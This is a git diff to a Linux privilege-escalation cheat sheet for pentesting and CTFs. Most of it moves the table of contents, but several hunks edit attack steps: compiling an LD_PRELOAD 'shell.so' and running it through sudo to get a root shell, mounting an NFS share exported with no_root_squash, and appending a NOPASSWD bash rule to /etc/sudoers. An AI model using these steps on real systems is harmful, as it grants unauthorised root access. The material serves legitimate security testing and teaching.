@@ -1,5 +1,49 @@
 # Linux - Privilege Escalation
 
+## Summary
+
+* [Tools](#tools)
+* [Checklist](#checklists)
+* [Looting for passwords](#looting-for-passwords)
+    * [Files containing passwords](#files-containing-passwords)
+    * [Old passwords in /etc/security/opasswd](#old-passwords-in--etc-security-opasswd)
+    * [Last edited files](#last-edited-files)
+    * [In memory passwords](#in-memory-passwords)
+    * [Find sensitive files](#find-sensitive-files)
+* [Scheduled tasks](#scheduled-tasks)
+    * [Cron jobs](#cron-jobs)
+    * [Systemd timers](#systemd-timers)
+* [SUID](#suid)
+    * [Find SUID binaries](#find-suid-binaries)
+    * [Create a SUID binary](#create-a-suid-binary)
+* [Capabilities](#capabilities)
+    * [List capabilities of binaries](#list-capabilities-of-binaries)
+    * [Edit capabilities](#edit-capabilities)
+    * [Interesting capabilities](#interesting-capabilities)
+* [SUDO](#sudo)
+    * [NOPASSWD](#nopasswd)
+    * [LD_PRELOAD and NOPASSWD](#ld_preload-and-nopasswd)
+    * [Doas](#doas)
+    * [sudo_inject](#sudo-inject)
+* [GTFOBins](#gtfobins)
+* [Wildcard](#wildcard)
+* [Writable files](#writable-files)
+    * [Writable /etc/passwd](#writable-etcpasswd)
+    * [Writable /etc/sudoers](#writable-etcsudoers)
+* [NFS Root Squashing](#nfs-root-squashing)
+* [Shared Library](#shared-library)
+    * [ldconfig](#ldconfig)
+    * [RPATH](#rpath)
+* [Groups](#groups)
+    * [Docker](#docker)
+    * [LXC/LXD](#lxclxd)
+* [Kernel Exploits](#kernel-exploits)
+    * [CVE-2016-5195 (DirtyCow)](#CVE-2016-5195-dirtycow)
+    * [CVE-2010-3904 (RDS)](#[CVE-2010-3904-rds)
+    * [CVE-2010-4258 (Full Nelson)](#CVE-2010-4258-full-nelson)
+    * [CVE-2012-0056 (Mempodipper)](#CVE-2012-0056-mempodipper)
+
+
 ## Tools
 
 - [LinuxSmartEnumeration - Linux enumeration tools for pentesting and CTFs](https://github.com/diego-treitos/linux-smart-enumeration)
@@ -22,47 +66,6 @@
 - [unix-privesc-check - Automatically exported from code.google.com/p/unix-privesc-check](https://github.com/pentestmonkey/unix-privesc-check)
 - [Privilege Escalation through sudo - Linux](https://github.com/TH3xACE/SUDO_KILLER)
 
-## Summary
-
-* [Checklist](#checklists)
-* [Looting for passwords](#looting-for-passwords)
-    * [Files containing passwords](#files-containing-passwords)
-    * [Old passwords in /etc/security/opasswd](#old-passwords-in--etc-security-opasswd)
-    * [Last edited files](#last-edited-files)
-    * [In memory passwords](#in-memory-passwords)
-    * [Find sensitive files](#find-sensitive-files)
-* [Scheduled tasks](#scheduled-tasks)
-    * [Cron jobs](#cron-jobs)
-    * [Systemd timers](#systemd-timers)
-* [SUID](#suid)
-    * [Find SUID binaries](#find-suid-binaries)
-    * [Create a SUID binary](#create-a-suid-binary)
-* [Capabilities](#capabilities)
-    * [List capabilities of binaries](#list-capabilities-of-binaries)
-    * [Edit capabilities](#edit-capabilities)
-    * [Interesting capabilities](#interesting-capabilities)
-* [SUDO](#sudo)
-    * [NOPASSWD](#nopasswd)
-    * [LD_PRELOAD and NOPASSWD](#ld-preload-and-passwd)
-    * [Doas](#doas)
-    * [sudo_inject](#sudo-inject)
-* [GTFOBins](#gtfobins)
-* [Wildcard](#wildcard)
-* [Writable files](#writable-files)
-    * [Writable /etc/passwd](#writable-etcpasswd)
-    * [Writable /etc/sudoers](#writable-etcsudoers)
-* [NFS Root Squashing](#nfs-root-squashing)
-* [Shared Library](#shared-library)
-    * [ldconfig](#ldconfig)
-    * [RPATH](#rpath)
-* [Groups](#groups)
-    * [Docker](#docker)
-    * [LXC/LXD](#lxclxd)
-* [Kernel Exploits](#kernel-exploits)
-    * [CVE-2016-5195 (DirtyCow)](#CVE-2016-5195-dirtycow)
-    * [CVE-2010-3904 (RDS)](#[CVE-2010-3904-rds)
-    * [CVE-2010-4258 (Full Nelson)](#CVE-2010-4258-full-nelson)
-    * [CVE-2012-0056 (Mempodipper)](#CVE-2012-0056-mempodipper)
 
 ## Checklists
 
@@ -356,7 +359,7 @@ If `LD_PRELOAD` is explicitly defined in the sudoers file
 Defaults        env_keep += LD_PRELOAD
 ```
 
-Compile the following C code with `gcc -fPIC -shared -o shell.so shell.c -nostartfiles`
+Compile the following shared object using the C code below with `gcc -fPIC -shared -o shell.so shell.c -nostartfiles`
 
 ```powershell
 #include <stdio.h>
@@ -370,7 +373,7 @@ void _init() {
 }
 ```
 
-Execute any binary with the LD_PRELOAD to spawn a shell : `sudo LD_PRELOAD=/tmp/shell.so find`
+Execute any binary with the LD_PRELOAD to spawn a shell : `sudo LD_PRELOAD=<full_path_to_so_file> <program>`, e.g: `sudo LD_PRELOAD=/tmp/shell.so find`
 
 ### Doas
 
@@ -478,14 +481,17 @@ echo "username ALL=NOPASSWD: /bin/bash" >>/etc/sudoers
 
 ## NFS Root Squashing
 
-When **no_root_squash** appears in `/etc/exports`, the folder is shareable and a remote user can mount it
+When **no_root_squash** appears in `/etc/exports`, the folder is shareable and a remote user can mount it.
 
 ```powershell
+# remote check the name of the folder
+showmount -e 10.10.10.10
+
 # create dir
 mkdir /tmp/nfsdir  
 
 # mount directory 
-mount -t nfs 10.10.10.10:/shared /tmp/nfsdir 
+mount -t nfs 10.10.10.10:/shared /tmp/nfsdir    
 cd /tmp/nfsdir
 
 # copy wanted shell 
@@ -690,3 +696,4 @@ https://www.exploit-db.com/exploits/18411
 - [Editing /etc/passwd File for Privilege Escalation - Raj Chandel - MAY 12, 2018](https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/)
 - [Privilege Escalation by injecting process possessing sudo tokens - @nongiach @chaignc](https://github.com/nongiach/sudo_inject)
 * [Linux Password Security with pam_cracklib - Hal Pomeranz, Deer Run Associates](http://www.deer-run.com/~hal/sysadmin/pam_cracklib.html)
+* [Local Privilege Escalation Workshop - Slides.pdf - @sagishahar](https://github.com/sagishahar/lpeworkshop/blob/master/Local%20Privilege%20Escalation%20Workshop%20-%20Slides.pdf)
